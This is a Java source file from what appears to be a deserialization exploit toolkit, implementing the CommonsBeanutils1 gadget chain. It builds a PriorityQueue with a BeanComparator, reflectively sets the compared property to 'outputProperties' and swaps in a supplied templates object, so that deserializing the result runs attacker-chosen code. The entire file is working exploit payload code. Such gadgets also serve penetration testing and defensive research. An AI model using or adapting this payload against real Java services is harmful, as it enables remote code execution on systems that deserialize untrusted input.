package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.Reflections;
import com.summersec.attack.deser.util.StandardExecutorClassLoader;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

//@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils1 implements ObjectPayload {
    @Override
    public Object getObject(Object templates) throws Exception {

        BeanComparator beanComparator = new BeanComparator("lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");


        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}



